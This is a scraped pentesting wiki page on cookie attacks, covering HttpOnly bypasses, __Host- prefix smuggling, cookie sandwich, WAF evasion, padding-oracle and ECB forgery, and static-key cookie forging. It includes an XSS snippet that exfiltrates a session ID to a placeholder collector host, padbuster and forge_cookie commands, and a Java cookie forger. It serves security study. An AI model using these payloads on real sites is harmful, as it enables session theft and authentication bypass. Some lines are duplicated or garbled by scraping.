---
title: "Cookies Hacking"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/hacking-with-cookies/index.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## Cookie Attributes

Cookies come with several attributes that control their behavior in the user’s browser. Here’s a rundown of these attributes in a more passive voice:

### Expires and Max-Age

The expiry date of a cookie is determined by the `Expires` attribute. Conversely, the `Max-age` attribute defines the time in seconds until a cookie is deleted. **Opt for `Max-age` as it reflects more modern practices.**

### Domain

The hosts to receive a cookie are specified by the `Domain` attribute. By default, this is set to the host that issued the cookie, not including its subdomains. However, when the `Domain` attribute is explicitly set, it encompasses subdomains as well. This makes the specification of the `Domain` attribute a less restrictive option, useful for scenarios where cookie sharing across subdomains is necessary. For instance, setting `Domain=mozilla.org` makes cookies accessible on its subdomains like `developer.mozilla.org`.

### Path

A specific URL path that must be present in the requested URL for the `Cookie` header to be sent is indicated by the `Path` attribute. This attribute considers the `/` character as a directory separator, allowing for matches in subdirectories as well.

### Ordering Rules

When two cookies bear the same name, the one chosen for sending is based on:

- The cookie matching the longest path in the requested URL.
- The most recently set cookie if the paths are identical.

### SameSite

- The `SameSite` attribute dictates whether cookies are sent on requests originating from third-party domains. It offers three settings:
  - **Strict** : Restricts the cookie from being sent on third-party requests.
  - **Lax** : Allows the cookie to be sent with GET requests initiated by third-party websites.
  - **None** : Permits the cookie to be sent from any third-party domain.

Remember, while configuring cookies, understanding these attributes can help ensure they behave as expected across different scenarios.

| **Request Type** | **Example Code** | **Cookies Sent When** |
|---|---|---|
| Link | <a href=“…”></a> | NotSet*, Lax, None |
| Prerender | <link rel=“prerender” href=“..”/> | NotSet*, Lax, None |
| Form GET | <form method=“GET” action=“…”> | NotSet*, Lax, None |
| Form POST | <form method=“POST” action=“…”> | NotSet*, None |
| iframe | <iframe src=“…”></iframe> | NotSet*, None |
| AJAX | $.get(“…”) | NotSet*, None |
| Image | <img src=“…”> | NotSet*, None |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.[\[15\]](#references)

A cookie with ***SameSite*** attribute will **mitigate CSRF attacks** where a logged session is needed.

***Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).[\[16\]](#references)

Notice that temporary, after applying this change, the **cookies without a SameSite** **policy** in Chrome will be **treated as None** during the **first 2 minutes and then as Lax for top-level cross-site POST request.**

## Cookies Flags

### HttpOnly

The `HttpOnly` flag prevents **client-side JavaScript** from reading the cookie through APIs such as `document.cookie`.

#### **Bypasses**

**Bypasses**

- If a page **returns cookies in the response body** (for example, a**phpinfo()** page), XSS may fetch that page and steal the reflected cookie despite`HttpOnly` .<sup>[\[6\]](#references)</sup><sup>[\[17\]](#references)</sup>
- This could be Bypassed with **TRACE****HTTP** requests as the response from the server (if this HTTP method is available) will reflect the cookies sent. This technique is called**Cross-Site Tracking** .<sup>[\[5\]](#references)</sup>  - This technique is avoided by **modern browsers by not permitting sending a TRACE** request from JS. However, some bypasses to this have been found in specific software like sending`\r\nTRACE` instead of`TRACE` to IE6.0 SP2.
- This technique is avoided by
- Another way is the exploitation of zero/day vulnerabilities of the browsers.
- It’s possible to **overwrite HttpOnly cookies** by performing a Cookie Jar overflow attack:

- It’s possible to use [**Cookie Smuggling**](#cookie-smuggling) attack to exfiltrate these cookies
- If any server-side endpoint echoes the raw session ID in the HTTP response (e.g., inside HTML comments or a debug block), you can bypass HttpOnly by using an XSS gadget to fetch that endpoint, regex the secret, and exfiltrate it.<sup>[\[7\]](#references)</sup> Example XSS payload pattern:

```
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
  .then(r => r.text())
  .then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Secure

The request will **only** send the cookie in an HTTP request only if the request is transmitted over a secure channel (typically **HTTPS**).

## Cookies Prefixes

Cookies prefixed with `__Secure-` are required to be set alongside the `secure` flag from pages that are secured by HTTPS.

For cookies prefixed with `__Host-`, several conditions must be met:

- They must be set with the `secure` flag.
- They must originate from a page secured by HTTPS.
- They are forbidden from specifying a domain, preventing their transmission to subdomains.
- The path for these cookies must be set to `/` .

It is important to note that cookies prefixed with `__Host-` are not allowed to be sent to superdomains or subdomains. This restriction aids in isolating application cookies. Thus, employing the `__Host-` prefix for all application cookies can be considered a good practice for enhancing security and isolation.

### Overwriting cookies

One protection of `__Host-`-prefixed cookies is preventing subdomains from overwriting them, which mitigates [cookie tossing](cookie-tossing.html). The **Cookie Crumbles** research showed parser discrepancies that accepted lookalike cookie names—such as names with `=` at the beginning or at both ends—and let a backend treat them as the protected name.[\[14\]](#references)[\[18\]](#references)

Or in PHP it was possible to add **other characters at the beginning** of the cookie name that were going to be **replaced by underscore** characters, allowing to overwrite `__HOST-` cookies:

#### Unicode whitespace cookie-name smuggling (prefix forgery)

Abuse discrepancies between browser and server parsing by prepending a Unicode whitespace code point to the cookie name. The browser won’t consider the name to literally start with `__Host-`/`__Secure-`, so it allows setting from a subdomain. If the backend trims/normalizes leading Unicode whitespace on cookie keys, it will see the protected name and may overwrite the high-privilege cookie.[\[8\]](#references)

- PoC from a subdomain that can set parent-domain cookies:

```
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
-
Typical backend behavior that enables the issue:
  - Frameworks that trim/normalize cookie keys. In Django, Python’s `str.strip()` removes a wide range of Unicode whitespace code points, causing the name to normalize to`__Host-name` .
  - Commonly trimmed code points include: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
  - Many frameworks resolve duplicate cookie names as “last wins”, so the attacker-controlled normalized cookie value overwrites the legitimate one.
- Frameworks that trim/normalize cookie keys. In Django, Python’s
-
Browser differences matter:
  - Safari blocks multibyte Unicode whitespace in cookie names (e.g., rejects U+2000) but still permits single-byte U+0085 and U+00A0, which many backends trim. Cross-test across browsers.
-
Impact: Enables overwriting of `__Host-` /`__Secure-` cookies from less-trusted contexts (subdomains), which can lead to XSS (if reflected), CSRF token override, and session fixation.
-
On-the-wire vs server view example (U+2000 present in name):

```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Many backends split/parse and then trim, resulting in the normalized `__Host-name` taking the attacker’s value.

#### Legacy `$Version=1` cookie splitting on Java backends (prefix bypass)

`$Version=1` cookie splitting on Java backends (prefix bypass)
Some Java stacks (e.g., Tomcat/Jetty-style) still enable legacy RFC 2109/2965 parsing when the `Cookie` header starts with `$Version=1`. This can cause the server to reinterpret a single cookie string as multiple logical cookies and accept a forged `__Host-` entry that was originally set from a subdomain or even over insecure origin.[\[8\]](#references)

- PoC forcing legacy parsing:

```
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
-
Why it works:
  - Client-side prefix checks apply during set, but server-side legacy parsing later splits and normalizes the header, bypassing the intent of `__Host-` /`__Secure-` prefix guarantees.
- Client-side prefix checks apply during set, but server-side legacy parsing later splits and normalizes the header, bypassing the intent of
-
Where to try: Tomcat, Jetty, Undertow, or frameworks that still honor RFC 2109/2965 attributes. Combine with duplicate-name overwrite semantics.

#### Duplicate-name last-wins overwrite primitive

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.[\[8\]](#references)

#### Detection and tooling

Use Burp Suite to probe for these conditions:

- Try multiple leading Unicode whitespace code points: U+2000, U+0085, U+00A0 and observe whether the backend trims and treats the name as prefixed.
- Send `$Version=1` first in the Cookie header and check if the backend performs legacy splitting/normalization.
- Observe duplicate-name resolution (first vs last wins) by injecting two cookies that normalize to the same name.
- Burp Custom Action to automate this: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)<sup>[\[9\]](#references)</sup>

Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Cookies Attacks

If a custom cookie contains sensitive data check it (specially if you are playing a CTF), as it might be vulnerable.

### Decoding and Manipulating Cookies

Sensitive data embedded in cookies should always be scrutinized. Cookies encoded in Base64 or similar formats can often be decoded. This vulnerability allows attackers to alter the cookie’s content and impersonate other users by encoding their modified data back into the cookie.

### Session Hijacking

This attack involves stealing a user’s cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can impersonate the legitimate user.

### Session Fixation

In this scenario, an attacker tricks a victim into using a specific cookie to log in. If the application does not assign a new cookie upon login, the attacker, possessing the original cookie, can impersonate the victim. This technique relies on the victim logging in with a cookie supplied by the attacker.

If you found XSS on a subdomain or control a subdomain, review the related cookie-tossing technique:

### Session Donation

Here, the attacker convinces the victim to use the attacker’s session cookie. The victim, believing they are logged into their own account, will inadvertently perform actions in the context of the attacker’s account.

For session-donation variants involving a controlled or XSS-affected subdomain, see the cookie-tossing technique below:

### [JWT Cookies](../hacking-jwt-json-web-tokens.html)

Click on the previous link to access a page explaining possible flaws in JWT.

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

This attack forces a logged-in user to execute unwanted actions on a web application in which they’re currently authenticated. Attackers can exploit cookies that are automatically sent with every request to the vulnerable site.

### Empty Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Browsers permit the creation of cookies without a name, which can be demonstrated through JavaScript as follows:[\[2\]](#references)

```
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
The result in the sent cookie header is `a=v1; test value; b=v2;`. Intriguingly, this allows for the manipulation of cookies if an empty name cookie is set, potentially controlling other cookies by setting the empty cookie to a specific value:

```
function setCookie(name, value) {
  document.cookie = `${name}=${value}`
}
setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
This leads to the browser sending a cookie header interpreted by every web server as a cookie named `a` with a value `b`.

#### Chrome Bug: Unicode Surrogate Codepoint Issue

In Chrome, if a Unicode surrogate codepoint is part of a set cookie, `document.cookie` becomes corrupted, returning an empty string subsequently:

```
document.cookie = "\ud800=meep"
```
This results in `document.cookie` outputting an empty string, indicating permanent corruption.[\[2\]](#references)

#### Cookie Smuggling Due to Parsing Issues

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Several web servers, including those from Java (Jetty, TomCat, Undertow) and Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), mishandle cookie strings due to outdated RFC2965 support. They read a double-quoted cookie value as a single value even if it includes semicolons, which should normally separate key-value pairs:[\[2\]](#references)

```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) The incorrect parsing of cookies by servers, notably Undertow, Zope, and those using Python’s `http.cookie.SimpleCookie` and `http.cookie.BaseCookie`, creates opportunities for cookie injection attacks. These servers fail to properly delimit the start of new cookies, allowing attackers to spoof cookies:[\[2\]](#references)

- Undertow expects a new cookie immediately after a quoted value without a semicolon.
- Zope looks for a comma to start parsing the next cookie.
- Python’s cookie classes start parsing on a space character.

This vulnerability is particularly dangerous in web applications relying on cookie-based CSRF protection, as it allows attackers to inject spoofed CSRF-token cookies, potentially bypassing security measures. The issue is exacerbated by Python’s handling of duplicate cookie names, where the last occurrence overrides earlier ones. It also raises concerns for `__Secure-` and `__Host-` cookies in insecure contexts and could lead to authorization bypasses when cookies are passed to back-end servers susceptible to spoofing.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), it might be possible to use the cookie attribute **`$Version=1`** to make the backend use an old logic to parse the cookie due to the **RFC2109**. Moreover, other values just as **`$Domain`** and **`$Path`** can be used to modify the behaviour of the backend with the cookie.[\[4\]](#references)

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) it’s possible to use the cookie sandwich technique to steal HttpOnly cookies.<sup>[\[13\]](#references)</sup> These are the requirements and steps:

- Find a place were an apparent useless **cookie is refected in the response**
- **Create a cookie called `$Version`** with value`1` (ou can do this in a XSS attack from JS) with a more specific path so it gets the initial possition (some frameworks like python don’t need this step)
- **Create the cookie that is reflected** with a value that leaves an**open double quotes** and with a specific path so it’s positioned in the cookie db after the previous one (`$Version` )
- Then, the legit cookie will go next in the order
- **Create a dummy cookie that closes the double quotse** inside its value

This way the victim cookie gets trapped inside the new cookie version 1 and will get reflected whenever it’s reflected. e.g. from the post:

```
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Check the previous section.

#### Bypassing value analysis with quoted-string encoding

This parsing indicate to unescape escaped values inside the cookies, so “\a” becomes “a”. This can be useful to bypass WAFS as:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

In the RFC2109 it’s indicated that a **comma can be used as a separator between cookie values**. And also it’s possible to add **spaces and tabs before an after the equal sign**. Therefore a cookie like `$Version=1; foo=bar, abc = qux` doesn’t generate the cookie `"foo":"bar, admin = qux"` but the cookies `foo":"bar"` and `"admin":"qux"`. Notice how 2 cookies are generated and how admin got removed the space before and after the equal sign.

#### Bypassing value analysis with cookie splitting

Finally different backdoors would join in a string different cookies passed in different cookie headers like in:

```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Which could allow to bypass a WAF like in this example:

```
Cookie: name=eval('test//
Cookie: comment')
Resulting cookie: name=eval('test//, comment') => allowed
```
### Extra Vulnerable Cookies Checks

#### **Basic checks**

**Basic checks**

- The **cookie** is the**same** every time you**login** .
- Log out and try to use the same cookie.
- Try to log in with 2 devices (or browsers) to the same account using the same cookie.
- Check if the cookie has any information in it and try to modify it
- Try to create several accounts with almost the same username and check if you can see similarities.
- Check the “**remember me** ” option if it exists to see how it works. If it exists and could be vulnerable, always use the cookie of**remember me** without any other cookie.
- Check if the previous cookie works even after you change the password.

#### **Advanced cookies attacks**

**Advanced cookies attacks**

If the cookie remains the same (or almost) when you log in, this probably means that the cookie is related to some field of your account (probably the username). Then you can:

- Try to create a lot of **accounts** with usernames very**similar** and try to**guess** how the algorithm is working.
- Try to **bruteforce the username** . If the cookie saves only as an authentication method for your username, then you can create an account with username “**Bmin** ” and**bruteforce** every single**bit** of your cookie because one of the cookies that you will try will the one belonging to “**admin** ”.
- Try **Padding****Oracle** (you can decrypt the content of the cookie). Use**padbuster** .

**Padding Oracle - Padbuster examples**

```
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf
# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster will make several attempts and will ask you which condition is the error condition (the one that is not valid).

Then it will start decrypting the cookie (it may take several minutes)

If the attack has been successfully performed, then you could try to encrypt a string of your choice. For example, if you would want to **encrypt** **user=administrator**

```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
This execution will give you the cookie correctly encrypted and encoded with the string **user=administrator** inside.

**CBC-MAC**

Maybe a cookie could have some value and could be signed using CBC. Then, the integrity of the value is the signature created by using CBC with the same value. As it is recommended to use as IV a null vector, this type of integrity checking could be vulnerable.

**The attack**

1. Get the signature of username **administ** =**t**
2. Get the signature of username **rator\x00\x00\x00 XOR t** =**t’**
3. Set in the cookie the value **administrator+t’** (**t’** will be a valid signature of**(rator\x00\x00\x00 XOR t) XOR t** =**rator\x00\x00\x00**

**ECB**

If the cookie is encrypted using ECB it could be vulnerable.

When you log in the cookie that you receive has to be always the same.

**How to detect and attack:**

Create 2 users with almost the same data (username, password, email, etc.) and try to discover some pattern inside the given cookie

Create a user called for example “aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa” and check if there is any pattern in the cookie (as ECB encrypts with the same key every block, the same encrypted bytes could appear if the username is encrypted).

There should be a repeated pattern at the cipher’s block size. After identifying the ciphertext blocks for controlled `a` characters, test whether removing or rearranging whole blocks can produce a cookie whose decoded username becomes `admin`.[\[3\]](#references)

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Some applications mint authentication cookies by encrypting only a predictable value (e.g., the numeric user ID) under a global, hard-coded symmetric key, then encoding the ciphertext (hex/base64). If the key is static per product (or per install), anyone can forge cookies for arbitrary users offline and bypass authentication.[\[1\]](#references)

How to test/forge

- Identify the cookie(s) that gate auth, e.g., COOKIEID and ADMINCOOKIEID.
- Determine cipher/encoding. In one real-world case the app used IDEA with a constant 16-byte key and returned the ciphertext as hex.
- Verify by encrypting your own user ID and comparing with the issued cookie. If it matches, you can mint cookies for any target ID (1 often maps to the first admin).
- Set the forged value directly as the cookie and browse; no credentials are needed.

## Minimal Java PoC (IDEA + hex) used in the wild

```
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;
public class App {
    private String ideaKey = "1234567890123456"; // example static key
    public String encode(char[] plainArray) { return encode(new String(plainArray)); }
    public String encode(String plain) {
        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
        IDEA encrypt = new IDEA();
        Key key;
        try {
            key = keygen.generateKey(this.ideaKey.getBytes());
            encrypt.initEncrypt(key);
        } catch (KeyException e) { return null; }
        if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
            for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
                plain = plain + " "; // space padding
            }
        }
        byte[] encrypted = encrypt.update(plain.getBytes());
        return Hex.toString(encrypted); // cookie expects hex
    }
    public String decode(String chiffre) {
        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
        IDEA decrypt = new IDEA();
        Key key;
        try {
            key = keygen.generateKey(this.ideaKey.getBytes());
            decrypt.initDecrypt(key);
        } catch (KeyException e) { return null; }
        byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
        try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
    }
    public void setKey(String key) { this.ideaKey = key; }
}
```
Mitigation: do not mint authentication cookies by encrypting predictable identifiers with a reusable key. Prefer server-side sessions or authenticated encryption/signatures with anti-replay properties.

### Public-key cookie forgery when decryption is treated as authentication

Some products misuse asymmetric crypto for bearer cookies: they **encrypt** cookie contents with a certificate-related keypair and later treat **successful private-key decryption** as proof the cookie is authentic. If the plaintext is not protected with a **signature, MAC, or AEAD tag**, anyone who knows the **public key** can forge arbitrary cookies offline.

Typical exploitation pattern:

- Identify which cookie or POST parameter carries the auth blob.
- Check whether the server exposes the matching public key via **TLS certificate reuse** ,**JWKS** , a downloadable certificate, or any other public trust store.
- Recreate the expected plaintext structure (user, role/domain, host ID, client OS/IP, timestamp, lifetime, etc.).
- Encrypt it with each candidate **public key** , encode it as expected, and replay it. If the server only checks that decryption succeeds and the fields parse, authentication is bypassed.

**GlobalProtect authentication override** is a practical example of this anti-pattern. When **authentication override cookies** are enabled, the portal/gateway accepts `portal-userauthcookie` or `portal-prelogonuserauthcookie` in a POST to `/ssl-vpn/login.esp`. If the certificate used for cookie encryption/decryption is also reused by the externally exposed HTTPS service, an unauthenticated attacker can retrieve the certificate chain over TLS, forge a cookie for any chosen identity, and submit it directly to the portal/gateway.[\[10\]](#references)[\[11\]](#references)

Quick testing ideas:[\[12\]](#references)

```
openssl s_client -connect <target>:443 -showcerts </dev/null
python3 forge_cookie.py --target <target> --context both --user admin
```
## References
